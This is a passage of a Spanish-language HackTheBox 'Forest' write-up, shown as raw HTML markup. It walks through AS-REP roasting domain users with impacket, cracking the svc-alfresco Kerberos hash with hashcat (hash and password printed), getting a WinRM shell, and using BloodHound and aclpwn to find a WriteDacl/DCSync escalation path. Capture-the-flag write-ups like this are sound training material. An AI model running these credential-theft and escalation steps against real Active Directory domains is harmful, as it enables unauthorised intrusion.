SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Ejecucion de script de impacket:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/impacket/examples# python GetNPUsers.py HTB/ -usersfile users -format hashcat -outputfile hashes.asreproast -dc-ip 10.10.10.161
Impacket v0.9.19 - Copyright &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; SecureAuth Corporation

&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User Administrator doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[... REDACTED ...]
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User sebastien doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User lucinda doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User andy doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; User mark doesn&lt;span class=&#34;s1&#34;&gt;&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set
&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;[-] User santi doesn&amp;#39;&lt;/span&gt;t have UF_DONT_REQUIRE_PREAUTH &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Dentro del archivo de hashes.asreproast encontramos el hash de uno de los usuarios.&lt;/p&gt;
&lt;h2 id=&#34;hashcat---kerberos&#34;&gt;HASHCAT - KERBEROs&lt;/h2&gt;
&lt;p&gt;Utilizamos hashcat para crackear el hash que obtuvimos con el script de impacket.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;sckull@uplifted:~/tools/hashcat$ ./hashcat64.bin -m &lt;span class=&#34;m&#34;&gt;18200&lt;/span&gt; pass_forest -o cracked.txt ../rockyou.txt --force  
hashcat &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;v5.1.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; starting...

nvmlDeviceGetFanSpeed&lt;span class=&#34;o&#34;&gt;()&lt;/span&gt;: Not Supported

OpenCL Platform &lt;span class=&#34;c1&#34;&gt;#1: NVIDIA Corporation&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;======================================&lt;/span&gt;
* Device &lt;span class=&#34;c1&#34;&gt;#1: GeForce MX130, 501/2004 MB allocatable, 3MCU&lt;/span&gt;

Hashes: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; digests&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique digests, &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; unique salts
Bitmaps: &lt;span class=&#34;m&#34;&gt;16&lt;/span&gt; bits, &lt;span class=&#34;m&#34;&gt;65536&lt;/span&gt; entries, 0x0000ffff mask, &lt;span class=&#34;m&#34;&gt;262144&lt;/span&gt; bytes, 5/13 rotates
Rules: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;

Applicable optimizers:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

Minimum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
Maximum password length supported by kernel: &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt;

ATTENTION! Pure &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;unoptimized&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; OpenCL kernels selected.
This enables cracking passwords and salts &amp;gt; length &lt;span class=&#34;m&#34;&gt;32&lt;/span&gt; but &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Temperature abort trigger &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; to 90c

Dictionary cache built:
* Filename..: ../rockyou.txt
* Passwords.: &lt;span class=&#34;m&#34;&gt;14344392&lt;/span&gt;
* Bytes.....: &lt;span class=&#34;m&#34;&gt;139921507&lt;/span&gt;
* Keyspace..: &lt;span class=&#34;m&#34;&gt;14344385&lt;/span&gt;
* Runtime...: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; sec

                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: Kerberos &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; AS-REP etype &lt;span class=&#34;m&#34;&gt;23&lt;/span&gt;
Hash.Target......: &lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$svc&lt;/span&gt;-alfresco@HTB:2f985636440000c102e7...6864af
Time.Started.....: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:04 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Time.Estimated...: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:06 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; secs&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Base.......: File &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;../rockyou.txt&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Guess.Queue......: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Speed.#1.........:  2181.4 kH/s &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;9.63ms&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; @ Accel:256 Loops:1 Thr:64 Vec:1
Recovered........: 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Digests, 1/1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;100.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; Salts
Progress.........: 4128768/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;28.78%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Rejected.........: 0/4128768 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.00%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Point....: 4079616/14344385 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;28.44%&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: s9039554h -&amp;gt; ruddsound1
Hardware.Mon.#1..: Temp: 51c Util: 63% Core:1189MHz Mem:2505MHz Bus:4

Started: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:45:56 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
Stopped: Fri Nov  &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; 02:46:07 &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Pass:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$krb5asrep$23$svc&lt;/span&gt;-alfresco@HTB:2f985636440000c102e7a67d333b3d24&lt;span class=&#34;nv&#34;&gt;$7&lt;/span&gt;b3a05d397f5ea656b6649ef36dfe3b0c9c5be004550dc64da438b19c056b1caf1c1408ad8840c7cb507c5ca040ad1abf3ceea9d68e13f82fb0d18df542343004c4ec202ae4b9b818457cde2a1ffe74bd8cf0bee3795e74fd1410946c1ae5323e00b3cfceda7f26e053eb6c2e3922dce1095812a6071aeee4a000442ae3f86f3676119df60fdf61bb4f287e3317128664557f0fa6f3b745b5f122afa5612b0c8fc398b2869e97240a81dda272f4ff802914b6c7c59cc80fd5e357097dd2848d66b5f346cf6bfe8de21bf5ba0ef2646c559be47ce0af236c2ce1e45afaf6864af:s3rvice
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;smbmap&#34;&gt;SMBMAP&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales del usuario svc-alfresco para ver en que SHARENAMES tenemos acceso en el puerto de samba.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_001300.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Confirmamos que solo tenemos acceso a NETLOGON y SYSVOL con psexec.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_002021.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---svc-alfresco&#34;&gt;User - SVC-ALFRESCO&lt;/h1&gt;
&lt;p&gt;En el reporte del escaneo de nmap vemos un puerto en el que podemos utilizar las credenciales para poder obtener una shell en el puerto de WINRM, utilizamos EVIL-WinRM.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/Hackplayers/evil-winrm&#34;&gt;Evil-WinRM&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Install:&lt;/strong&gt; &lt;code&gt;gem install evil-winrm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot_20191105_000802.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Utilizamos &lt;code&gt;bloodhound.py&lt;/code&gt; para poder obtener la lista de usuarios, permisos de usuarios, grupos de usuarios e importar los datos en bloodhound para ver la ruta que podemos seguir para obtener permisos administrativos utilizando la informacion que nos proporciona bloodhound.&lt;/p&gt;
&lt;h2 id=&#34;booldhoundpy&#34;&gt;Booldhound.py&lt;/h2&gt;
&lt;p&gt;Utilizamos las credenciales del usuario svc-alfresco, el dominio y el namesever para obtener los datos.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.13.16.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Comprimimos los archivos en zip.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.15.35.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;bloodhound&#34;&gt;Bloodhound&lt;/h2&gt;
&lt;p&gt;Importamos los datos que obtuvimos a bloodhound. Nos mostrará un mapa con todos los usuarios disponibles y los grupos de usuarios a los que pertenecen, con los distintos permisos que cada uno tiene, incluso, los permisos que tienen uno sobre otro.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.16.10.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Nos ubicamos en el usuario actual (svc-alfresco) y vemos informacion del usuario, lo que nos interesa es &lt;code&gt;Recehable High Values&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.20.58.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Podemos ver que el usuario es miembro de varios grupos, y tiene permisos de &lt;strong&gt;WriteDACL&lt;/strong&gt;, que le permiten al usuario modificar permisos de dominio en este caso &lt;strong&gt;htb.local&lt;/strong&gt; y realizar operaciones en &lt;strong&gt;DCSync&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/forest/Screenshot%20from%202019-11-29%2021.29.36.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Bloodhound nos proporciona cierta informacion que puede ser de utilidad para realizar estas operaciones, para ello nos ubicamos en &lt;code&gt;Writedacl &amp;gt; Help &amp;gt; Abuse Info&lt;/code&gt;.&lt;/p&gt;
&lt;h2 id=&#34;aclpwn&#34;&gt;ACLPWN&lt;/h2&gt;
&lt;p&gt;Podemos hacerlo de forma automatizada utilizando esta herramienta, aclpwn permite encontrar y explotar una ruta para obtener privilegios administrativos utilizando los datos obtenidos de bloodhound desde la base de datos.&lt;/p&gt;
&lt;p&gt;Realizamos una busqueda del camino mas cercano:&lt;/p&gt;
&lt;p&gt;Los parametros:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;-f usuario/computadora &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Es el nodo de inicio&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-ft user &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que el nodo inicial es usuario/computadora/dominio/grupo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-t htb.local &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;El destino al cual deseamos llegar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-tt domain &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que el destino es usuario/computadora/dominio/grupo&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-d htb.local &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;El Dominio&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-du neo4j &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Usuario para la base de datos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-dp toor &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Contraseña para la base de datos&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
-dry &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Especificamos que no deseamos atacar&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Podemos ver que encontro un camino y puede ser explotado.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@kali:~/tools/aclpwn.py# aclpwn -f svc-alfresco -ft user -t htb.local -tt domain -d htb.local -dry -du neo4j -dp toor
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
Path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC-ALFRESCO@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SERVICE ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PRIVILEGED IT ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ACCOUNT OPERATORS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GenericAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE TRUSTED SUBSYSTEM@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WriteDacl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;!&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Unsupported operation: GetChanges on HTB.LOCAL &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Domain&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Invalid path, skipping
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Path found!
Path &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;: &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SVC-ALFRESCO@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;SERVICE ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;PRIVILEGED IT ACCOUNTS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;MemberOf&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ACCOUNT OPERATORS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;GenericAll&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;EXCHANGE WINDOWS PERMISSIONS@HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;WriteDacl&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;-&amp;gt;&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;HTB.LOCAL&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
